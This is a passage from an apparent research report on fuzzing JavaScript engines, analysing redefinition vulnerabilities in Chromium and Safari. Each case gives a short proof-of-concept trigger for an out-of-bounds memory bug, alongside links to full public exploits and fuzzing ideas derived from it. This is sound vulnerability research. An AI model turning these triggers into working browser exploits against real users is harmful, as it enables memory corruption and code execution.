89 https://www.w3schools.com/browsers/browsers_chrome.asp 
90 https://bugs.chromium.org/p/chromium/issues/detail?id=997997 
46 
4.3 Redefinition vulnerabilities 
In redefinition vulnerabilities the functionality of invoked functions is modified to break 
assumptions from engine developers 91. For example, a getter can be defined to return a 
malicious value. Another example is a callback function which modifies the internal state of 
the current object like the length of an array.  
The most common methods to trigger callbacks are the following: 
• 
Overwriting a getter or setter of a property. 
• 
Passing as argument to a function an object instead of a number or string and 
defining the valueOf() or toString() method to trigger a callback when the object value 
is evaluated. 
• 
Using Symbol.species to change the returned default constructor. 
• 
Using the Proxy object to hook operations such as get, set, has, deleteProperty or 
similar. 
• 
Modifying the prototype or performing the above-mentioned techniques on the 
prototype chain of a variable. 
• 
Redefining global functions or properties. 
• 
Creating a subclass of a default class and then passing objects of the subclass as 
arguments to functions. The subclass can overwrite functions to trigger callbacks. 
4.3.1 Redefined function modifies expected behavior 
In the simplest case a getter is defined to return not expected values for accessed properties. 
Since such vulnerabilities are simple, most of them were already found several years ago. 
In more complex cases the functionality of the newly defined function is modified. For 
example, a newly defined constructor can allocate less space than assumed. 
Examples: 
Chromium issue 351787, CVE-2014-1705 (Pwn2Own 2014) – OOB access in 
Uint32Array 
01: var ab = new ArrayBuffer(8); 
02: ab.__defineGetter__("byteLength", function () { return 0xFFFFFFFC; }); 
03: var aaa = new Uint32Array(ab); 
04: aaa[0x1234567] = 1; 
// OOB access 
When the typed array representation Uint32Array is applied, the byteLength property of ab 
is read to set the length of aaa. A getter was defined to return a malicious byteLength value 
to achieve OOB memory access. 
This vulnerability was exploited during the Pwn2Own 2014 exploitation competition 
(Pwnium4). The vulnerability was combined with three other vulnerabilities to achieve 
91 https://googleprojectzero.blogspot.com/2015/08/attacking-ecmascript-engines-with.html 
47 
persistent code execution on Chrome OS and resulted in a 150,000 Dollar 92 payout. 
Moreover, the vulnerability was awarded as the best client-side bug in the pwnie award 2014. 
The full exploit code is available in the issue tracker 93. A detailed writeup is available in the 
Palo Alto Networks blog 94. 
Generalization for variation analysis: 
• 
A fuzzer should define getters for properties and return manipulated values. 
Chromium issue 386988, CVE-2014-3176 – Array.prototype.concat redefinition 
vulnerability 
01: a = [1]; 
02: b = []; 
03: a.__defineGetter__(0, function () { 
04:     b.length = 0xffffffff; 
05: }); 
06: c = a.concat(b); 
In line 6 the Array.prototype.concat function is called. The C++ implementation of this built-
in function first extracts the length fields of the arrays to estimate the size of the result array. 
After that, the concat operation is performed which triggers the defined getter. The getter 
modifies the length of the b array in line 4 which means that the concat operation will copy 
more elements to the result array than initially allocated by the code which leads to OOB 
access.  
Exploits for the vulnerability are available at 95 and at 96. 
Generalization for variation analysis: 
• 
A fuzzer should define getters which perform state modifications like changing the 
length of an array. 
• 
The fuzzer should create objects in pairs. In the above case the a and b objects are 
a pair and line 6 invokes a function with both objects involved. The callback defined 
for the first object then modifies the state of the second object as shown in line 4. 
92 https://chromereleases.googleblog.com/2014/03/stable-channel-update-for-chrome-os_14.html 
93 https://bugs.chromium.org/p/chromium/issues/detail?id=351787 
94 https://unit42.paloaltonetworks.com/google-chrome-exploitation-case-study/ 
95 https://bugs.chromium.org/p/chromium/issues/detail?id=386988 
96 https://github.com/4B5F5F4B/Exploits/blob/master/Chrome/CVE-2014-3176/exploit.html 
48 
Chromium issue 716044 (2017) – OOB write in Array.prototype.map builtin via 
redefined constructor 
01: class Array1 extends Array { 
02:     constructor(len) { 
03:         super(1);   // Redefine constructor to allocate 1 byte instead of len bytes 
04:     } 
05: }; 
06: class MyArray extends Array { 
07:     static get [Symbol.species]() { 
08:         return Array1; // Return an array with a redefined constructor 
09:     } 
10: } 
11: a = new MyArray(); 
12: for (var i = 0; i < 10000000; i++) { 
13:     a.push(1); 
// Create an array with a lot of values 
14: } 
15: a.map(function (x) { return 42; });  // Trigger OOB write 
In line 15 the map function is called which invokes the passed function on every element of 
the array and returns a new array as result. The type of a is MyArray which is an extended 
array class. This allows to overwrite Symbol.species to specify another array-extended type 
which is used for new copies of the array. Such a copy is for example created by the map 
function. The constructor of this class calls super() with argument one in line 3, which just 
allocates space for one entry. The passed len argument, see line 2, is not used at all. This 
constructor is called by the internal implementation of the map function and later code in this 
function assumes that a buffer of length len was allocated. However, since the constructor 
was redefined, only a buffer of length one gets allocated. This leads to OOB write access 
because the allocated buffer is too small for the operations performed by the map function. 
A full exploit is available in the bug tracker 97 and in a blog post 98 from Chang, the reporter 
of the vulnerability. 
Generalization for variation analysis: 
• 
A fuzzer should use Symbol.species to redefine the behavior of constructors. 
• 
Constructors should call the parent constructor with fuzzed values. 
97 https://bugs.chromium.org/p/chromium/issues/detail?id=716044 
98 https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ 
49 
4.3.2 Redefined function modifies array length 
Built-in JavaScript functions are typically implemented in native C++ code. If such a built-in 
function is invoked and expects an array as argument, the function often reads at the 
beginning the array length and stores it in a local variable. When the code later iterates 
through the array or accesses other passed arguments, a callback can be triggered. Inside 
the callback the array length can be modified. When the code returns from the callback, the 
original array length is still stored in the local variable and is maybe used in the code like in 
a loop break condition. If the code fails to check after callback invocations if the length value 
was modified, it can lead to OOB memory access. 
In such vulnerabilities the engine developers assumed callbacks cannot be triggered or 
cannot change the state of the handled object. The modification of the array length is a 
common attack target. However, other objects states can be attacked as well. 
Several variations of this vulnerability category can be found in v8 by grepping in the 
test/mjsunit/regression folder for the substrings .length = 0 or .length = 1. 
Examples: 
Chromium issue 554946, CVE-2015-6764 (Mobile Pwn2Own 2015) – OOB access in 
JSON.stringify() with toJson() redefinition 
01: var array = []; 
02: var funky = {   // Create an obj with toJSON() which modifies the array length 
03:     toJSON: function () { array.length = 1; gc(); return "funky"; } 
04: }; 
05: for (var i = 0; i < 10; i++) array[i] = i;  // Create an array of length 10 
06: array[0] = funky;   // Assign the obj with a custom toJSON() func. as first element 
07: JSON.stringify(array);  // Trigger OOB access 
When the JSON.stringify function is called in line 7, the internal C++ implementation of the 
function gets invoked. First, the function extracts the current array length to calculate how 
many elements must be iterated. However, during an iteration the array length can change 
because the code invokes the toJSON callback. This function was redefined for element 
zero in line 6 and the function modifies the array length in line 3 to shrink the array. After the 
first iteration in JSON.stringify() finishes, the array shrunk and just stores one element. 
However, the original array length is still stored in a local variable and is used in the loop 
break condition. Further loop iterations are therefore performed which access data OOB. 
Exploitation details and the original exploit are available at 99. A slightly adapted exploit is 
available at 100. 
99 https://github.com/secmob/cansecwest2016 
100 https://github.com/4B5F5F4B/Exploits/tree/master/Chrome/CVE-2015-6764 
50 
Generalization for variation analysis: 
• 
A fuzzer should create arrays with elements which have callbacks defined. The 
callbacks should set the array length to zero or one and garbage collection should 
be triggered afterwards. 
Chromium issue 594574, CVE-2016-1646 (Pwn2Own 2016) – Redefinition leads to OOB 
access via Array.concat 
01: array = new Array(10) 
02: array[0] = 1.1 
// Note that array[1] is a hole 
03: array[2] = 2.1 
04: array[3] = 3.1 
05: var proto = {}; 
06: array.__proto__ = proto; 
07: Object.defineProperty( 
08:     proto, 1, { 
09:         get() { 
10:             array.length = 1; // shorten the array 
11:             gc(); 
// and trigger garbage collection to free the memory 
12:             return "value from proto"; // does not matter 
13:         }, 
14:         set(new_value) { } 
15:     }); 
16: Array.prototype.concat.call(array); 
This vulnerability is similar to the previous described one. Line 16 invokes the Array.concat 
function which initially extracts the array length, which is 10 at this point. However, during 
processing of the concat function a callback can be triggered which modifies the array length. 
Element one of array was not defined as shown in lines 2 and 3. The prototype of array is 
changed to an object in line 6. This means a getter for element one can be defined which is 
invoked as soon as element one of array is accessed. This getter is defined in line 9 and the 
getter modifies the array length and invokes garbage collection. This getter is triggered 
during processing of the concat function which leads to OOB memory access because the 
concat function still assumes the initial extracted array length. 
The vulnerability was found by Xu from Tencent KeenLab. An exploit is available at 101. 
Generalization for variation analysis: 
• 
A fuzzer should define callback functions on variables such as objects and assign 
these variables to the prototype of other variables. The callbacks should modify the 
length of an array or perform other state modifying operations. 
101 https://github.com/4B5F5F4B/Exploits/blob/master/Chrome/CVE-2016-1646/exploit.html 
51 
Safari CVE-2016-4622 - Array.slice OOB access 
01: var a = [1, 2, 3, 4, 5]; 
02: var i = {}; 
03: i.valueOf = function () { 
04:     a.length = 1; 
05:     return 5; 
06: } 
07: a.slice(0, i); 
This vulnerability is similar to the previous discussed ones. The array.slice function initially 
extracts the length of the array and stores it in a local variable. At a later point, the second 
argument, the end index for the slice operation, is read which leads to the invocation of the 
valueOf callback, which is defined in lines 3 to 6. The callback shrinks the array and returns 
as end index a bigger value, which leads to OOB memory access within the slice operation. 
The vulnerability was found by Groß, a detailed writeup is available at 102. An exploit is 
available at 103. 
Generalization for variation analysis: 
• 
A fuzzer should during mutation replace plain numbers or strings in test cases with 
objects, which implement callback functions. This especially applies to numbers or 
strings passed to built-in functions. The callback function should perform state 
modification operations such as changing the length of an array. 
Chromium issue 702058, CVE-2017-5053 (Pwn2Own 2017) – Array.prototype.indexOf 
bailout bug leading to OOB access 
01: arr = []; 
02: for (var i = 0; i < 100000; i++) arr[i] = 0; 
03: var fromIndex = { valueOf: function () { arr.length = 0; gc(); } };    
04: arr.indexOf(1, fromIndex);  // Trigger OOB 
This vulnerability is a variation of CVE-2016-4622. While CVE-2016-4622 affected Safari 
and used the Array.slice function, CVE-2017-5053 affected Chromium and used the 
Array.indexOf function. The indexOf function first extracts the length of the array, stores it in 
a local variable and then starts to iterate through all elements. Before the loop starts, the 
fromIndex argument is read to obtain the index from which the search should start. However, 
the fromIndex is an object and not a number. Reading the fromIndex therefore triggers the 
valueOf callback which modifies the array length. When the loop starts afterwards, the 
incorrect array length is still stored in a local variable leading to a wrong loop break condition. 
The loop therefore leads to OOB access. 
Detailed exploitation details were presented in 2019 by Zheng et al. [8]. 
102 http://www.phrack.org/papers/attacking_javascript_engines.html 
103 https://github.com/saelo/jscpwn 
52 
Generalization for variation analysis: 
• 
Instead of passing a number or a string as argument, an object with a redefined 
valueOf or toString function can be passed. These callback functions should 
especially modify the length of an array or perform other state modification 
operations. 
• 
A fuzzer should be able to understand simple connections of variables. For example, 
in line 4 the indexOf function is called on the arr array. The fromIndex argument leads 
to the callback which modifies the length of the same arr array. It makes sense that 
this callback modifies the arr array and not a random other array because the 
callback has a connection to the arr array. This connection exists because line 4 calls 
a function on arr and fromIndex is an argument to this function and the callback is a 
function of fromIndex. A fuzzer should store such connections and should prefer the 
insertion of state modifications on objects which have a connection to the callback. 
Chromium issue 938251 (2019) – Integer overflow in NewFixedDoubleArray 
01: array = []; 
02: array.length = 0xffffffff; // Negative number 
03: b = array.fill(1.1, 0, { 
04:     valueOf() { 
05:         // Cause the array to shrink 
06:         // This will cause FastElementsAccessor::FillImpl to  
07:         // regrow it to 0xffffffff which is negative 
08:         array.length = 32; 
09:         array.fill(1.1); 
10:         return 0x80000000; // End length is negative 
11:     } 
12: }); 
The array length is set to a negative number in line 2 and after that, the fill function is called 
on the array. The first passed argument is the fill value, the second argument is the start 
index and last argument is the end index. Instead of a number an object with a valueOf 
function is passed to trigger code execution when the end index gets accessed. This callback 
function shrinks the array and when the fill function code continues execution, it regrows the 
array. This regrow operation happens because the developers added code to check for array 
length modifications. However, during the regrow operation an integer overflow occurs 
because of the negative length value defined in line 2. This leads to an allocation of an 
undersized buffer and therefore to OOB memory access. 
A detailed writeup is available in the issue tracker 104 together with a full exploit 105.  
Generalization for variation analysis: 